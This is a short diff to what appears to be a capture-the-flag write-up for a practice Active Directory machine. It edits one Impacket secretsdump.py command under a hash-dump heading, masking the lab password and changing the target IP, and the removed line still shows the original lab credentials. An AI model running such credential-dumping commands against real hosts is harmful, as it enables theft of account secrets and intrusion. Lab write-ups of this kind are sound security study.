@@ -280,7 +280,7 @@ Hashe Dump
 >## secretsdump.py
 
 ```
-root@ubuntu:~# secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.116.57
+root@ubuntu:~# secretsdump.py vulnnet-rst.local/a-whitehat:******************@10.10.250.157
 Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation
 
 [*] Service RemoteRegistry is in stopped state
